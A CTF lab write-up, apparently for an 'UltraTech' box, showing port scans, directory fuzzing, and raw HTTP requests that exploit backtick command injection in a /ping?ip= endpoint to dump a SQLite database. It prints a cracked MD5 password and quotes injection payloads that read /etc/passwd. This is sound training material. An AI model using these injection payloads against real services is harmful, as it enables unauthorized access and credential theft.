


```
kali@kali ~> nmap -sC -sV -Pn -p 21,22,31331,8081 10.10.65.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 03:19 EDT
Nmap scan report for 10.10.65.100
Host is up (0.21s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.02 seconds
```


```
kali@kali ~> ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.65.100:31331/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.65.100:31331/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 485ms]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140, Duration: 644ms]
.hta                    [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 2264ms]
.htpasswd               [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 6723ms]
css                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 240ms]
favicon.ico             [Status: 200, Size: 15086, Words: 11, Lines: 7, Duration: 719ms]
images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 240ms]
index.html              [Status: 200, Size: 6092, Words: 393, Lines: 140, Duration: 241ms]
js                      [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 231ms]
javascript              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 725ms]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 6, Duration: 643ms]
server-status           [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 435ms]
:: Progress: [4614/4614] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:40] :: Errors: 0 ::

```


```
kali@kali ~> ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.65.100:8081/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.65.100:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 20, Words: 3, Lines: 1, Duration: 234ms]
auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 968ms]
ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 2011ms]
:: Progress: [4614/4614] :: Job [1/1] :: 30 req/sec :: Duration: [0:02:20] :: Errors: 0 ::

```


go to `robots.txt` -> `partners.html` -> and then theres a login page, intercept the request and you shouldbe able to find this

```
GET /ping?ip=10.10.65.100 HTTP/1.1 <----------- command injection here

Host: 10.10.65.100:8081

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Origin: http://10.10.65.100:31331

Connection: close

Referer: http://10.10.65.100:31331/

If-None-Match: W/"107-mdONu5fDluaPJnH9eTCRknJTPGM"
```




```
GET /ping?ip=`ls` HTTP/1.1

Host: 10.10.65.100:8081

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Origin: http://10.10.65.100:31331

Connection: close

Referer: http://10.10.65.100:31331/

If-None-Match: W/"107-mdONu5fDluaPJnH9eTCRknJTPGM"

```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 49
ETag: W/"31-HlSQypQjJ8bvYzsasjt4yTZkt90"
Date: Fri, 15 Mar 2024 07:13:04 GMT
Connection: close



ping: utech.db.sqlite: Name or service not known

```


```
GET /ping?ip=`cat+utech.db.sqlite` HTTP/1.1
Host: 10.10.65.100:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.10.65.100:31331
Connection: close
Referer: http://10.10.65.100:31331/
If-None-Match: W/"107-mdONu5fDluaPJnH9eTCRknJTPGM"
```


```
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 147
ETag: W/"93-594eIY8lmtfDeu2ln6BdpbW24SI"
Date: Fri, 15 Mar 2024 07:13:40 GMT
Connection: close
ping: )
ï¿½ï¿½ï¿½(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

```

`r00t:f357a0c52799563c7c7b76c1e7543a32`


using crackstation

```
Hash	Type	Result
f357a0c52799563c7c7b76c1e7543a32	md5	n100906
```

now we can SSH into the machine



https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#basic-commands


---

# Mistakes

Try EVERYTHING, literally EVERYTHING before moving on and READ EVERYTHING BRO.... EVERYTTHINGGG

in this case in the URL https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#basic-commands i completely missed this seciton

### Inside a command  <------- HERE!!!

[Inside a pre-existing wrong](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#inside-a-command)

- Command injection using backticks.

```shell
    original_cmd_by_server `cat /etc/passwd`
```

- Command injection using substitution
```shell
    original_cmd_by_server $(cat /etc/passwd)
```